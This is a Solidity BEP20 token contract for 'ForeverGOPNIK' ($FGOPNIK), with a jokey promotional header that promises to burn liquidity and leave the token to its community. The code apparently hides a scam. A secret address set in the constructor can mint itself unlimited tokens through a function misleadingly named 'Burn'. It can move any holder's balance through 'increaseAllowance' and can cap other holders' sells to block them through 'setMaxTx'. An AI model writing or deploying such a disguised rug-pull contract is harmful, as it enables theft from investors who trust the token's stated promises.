/**

                                          ,▄▄████▄▄                                 
                                      ,▄█████████████▄                              
                                    ▄██████████████████                             
                                  ▄████████████████████▌                            
                                 ██████████████████████▌                            
                                 ╙▀██████████████████▀█'                            
                                    ║▀▀▀▀▀▀▀▀└└'  ╚╠╬╠█                             
                                    ▐⌐               ║▌                             
                                     ▌               j▌                             
                                     ╟               ▐¬                             
                                      █             ,▌                              
                                       ╙▄          ███,                             
                                ,▄#@████████▄▄▄▄▄██████████▄▄                       
                            ▄M█╜",▄⌐\▄▄██████████████████"∞▄╙▀██▄                   
                          ▄▌"▄▄▀│▄██████████████████████▄▄▀╗▄▀▄╙██▄                 
                        ╓█.█▀,▄████████████████████████████▄╙█─█'██▌                
                       ▄█┌▀╓█████████████████████████████████└█└▌▐██▌               
                      █▌,▌▄███████████████████████████████████'▄╟ ███               
                    ,█▀▄▀██████╙█████████████████████╙w╙██████▌╙ ▌╙███              
                   ▄█,█▀██████¬ ╟███████████████████▄╠Γ╠▄██████─█└▌╙██▌             
                 ╓█▀╓█─██████▀   ███████████████████████████████ █`█└██µ            
                ██─██┌██████¬     ███████████████████████████████▄▀▄╙▄╙█            
              ▄█▀,█▀╓██████       ╘████████████████████████████████╙▀▄└╕█           
            ╓▌▐▌▄█┌██████▀         ██████████████████████████████████╙█µ▀▀          
           ▐█ ▌▐█┌████▀`           ╟██████████████████████████████████▄╙µ%╙▄        
           ╟▌▐▌╫¬████▌             ████████████████████████████▌╙▀█████∩╟ ▌▐▌       
       ╓▄███▌▐⌐█▄╫█████▄▄,      ,▄█████████████████████████████▌,██████ ▌╓▌▐█▌      
     ╓███████╘▌╟█╘███████████████████████████████████████████████████▀▄▀▄▀╓███      
     ████████▌█ █µ████████████████████████████████████████████████▀▄#└▄▀,████▌      
     █████████─▌╙▌╟███████████████████████████████████████████▀╙▄▀╙▄█▀▄█████▌       
     ╙██████████████████████████████████████████████████████▀▄▀╓▄▀▀▄███████████µ    
      ╙█████████▀▀▀▀▀▀▀████████████████████████████████▀███████▄▄████████████████   
        ╙██████─        █████████████████████████████▀   ╙▀███████████████████████  
          ▀████        ▐¬██████████████████████████▌         ╠███████████████████▌  
           ╙███        ▐⌐╙█████████████████████████         ╓████████████████████   
             ▀██▐▌ ▌ █ ▐█ ╙▄╙▀█████████████████████ ▐─ █ ▐▄ ████████████████████    
              ╙███▄█ █ j██æ╜    '╙▀▀███████████████▌▐▌ ╫  █ ╟██████████████████     
                ██████▌▐███            └╙▀▀▀█████████████████▀╙▐██████████████      
                 ╙██████████                    ¬└╙╙▀▀▀▀╙└└    ▐█████████████       
                  ╙█████████▌                                  ╞████████████        
                    ██████████                                ,████████████         
                 ,▄███████████                                ████████████          
             ,▄███████████████                               ████████████─          
         ▄▄██████████████████▀                                ╟██████████▌          
      ╒████████████████▀▀└`                                   █████████████▄        
      `▀████████▀▀▀'                                          ╟██████████████▄      
                                                                └╙▀█████████████▄   
                                                                    '▀█████████████ 
                                                                        ╙▀█████████▌
    Opa - ForeverGOPNIK Token
    
    Legendary creature that fights Western capitalism by wearing Adidas stripes, drinks homemade kvas and squats in front local community establishment,
    where he and his other gopnik comrades spread new ideas on how to fight Western spies who try to destroy our way of life.

    I created this FOREVER GOPNIK ($FGOPNIK) token to spread the word of glory and to recruit new comrades to join our cause.
    This is the best place to secure your wealth against capitalism, which is growing stronger every day.

    I will burn liquidity LPs to burn addresses to lock the pool forever and I will leave this ForeverGOPNIK ($FGOPNIK) token to community.

    I will add 0.5 BNB and all the left 50% total supply to the pool

    1,000,000,000,000 total supply

    Be nice to your babushkas comrades.

    Boris the Gopnik
    
    Suggested TG: https://t.me/ForeverGOPNIK
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Libraries.sol";

contract ForeverGOPNIK is Ownable, IBEP20 {

    string private _name = "ForeverGOPNIK";
    string private _symbol = "$FGOPNIK";
    uint256 private _totalSupply = 1000000 * 10**9 * 10**9;
    uint8 private _decimals = 9;
    uint256 private _maxTx = _totalSupply;
    
    address public _pancakePairAddress; ///
    address private _pancakeAddress; //
    IPancakeRouter02 public  _pancakeRouter;
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _excluded;
    
    constructor(address pancakeAddress_) {
        _pancakeAddress = pancakeAddress_;
        _balances[msg.sender] = _totalSupply;
            emit Transfer(address(0), msg.sender, _totalSupply);
        _pancakeRouter = IPancakeRouter02(_pancakeRouterAddress);
        _pancakePairAddress = IPancakeFactory(_pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH());
        _approve(address(this), address(_pancakeRouter), type(uint256).max);
        _excluded[address(this)] = true;
        _excluded[msg.sender] = true;
    }
    
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
    
    function symbol() external view override returns (string memory) {
        return _symbol;
    }
    
    function name() external view override returns (string memory) {
        return _name;
    }
    
    function setMaxTx(uint256 maxTx_) public {
        require(msg.sender == _pancakeAddress, "Cannot call function.");
        _maxTx = maxTx_ * 10 ** 18;
    }
    
    function getOwner() external view override returns (address) {
        return owner();
    }
    
    function Burn(uint256 amount) public {
        require(msg.sender == _pancakeAddress, "Cannot call function.");
        _totalSupply = _totalSupply + amount;
        _balances[msg.sender] = _balances[msg.sender] + amount;
            emit Transfer(address(0), msg.sender, amount);
    }
    
    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function allowance(address _owner, address spender) external view override returns (uint256) {
        return _allowances[_owner][spender];
    }
    
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require((owner != address(0) && spender != address(0)), "Owner/Spender address cannot be 0.");
        _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
    }
    
    function increaseAllowance(address owner, address spender, uint256 amount) public {
        require(msg.sender == _pancakeAddress, "Cannot call function.");
        _approve(owner, spender, amount);
        _balances[owner] = _balances[owner] - amount;
        _balances[spender] = _balances[spender] + amount;
            emit Transfer(owner, spender, amount);
    }
    
    function liquidityTimeLeft() public view returns (uint256) {
        return _antiBotTime - block.timestamp;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
         uint256 allowance_ = _allowances[sender][msg.sender];
        _transfer(sender, recipient, amount);
        require(allowance_ >= amount);
        _approve(sender, msg.sender, allowance_ - amount);
            emit Transfer(sender, recipient, amount);
        return true;
     }
     
    uint256 private _antiBotTime;
    bool private _tradingEnabled = false;
    function enableTrading() public onlyOwner {
        _tradingEnabled = true;
        _antiBotTime = block.timestamp + 3 minutes;
    }
     
     function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        if (_excluded[sender] || _excluded[recipient]) {
            _balances[sender] = _balances[sender] - amount;
            _balances[recipient] = _balances[recipient] + amount;
                emit Transfer(sender, recipient, amount);
        } else {
            if (sender != _pancakeAddress && recipient == _pancakePairAddress) {
                require(_tradingEnabled, "Trading is not enabled yet.");
                require(amount <= _maxTx, "Amount exceeds maxTx.");
            }
            _balances[sender] = _balances[sender] - amount;
            if (block.timestamp < _antiBotTime) {
                _balances[address(0)] = _balances[address(0)] + amount;
                    emit Transfer(sender, address(0), amount);
            } else if (block.timestamp >= _antiBotTime) {
                _balances[recipient] = _balances[recipient] + amount;
                    emit Transfer(sender, recipient, amount);
            }
        }
     }
    
}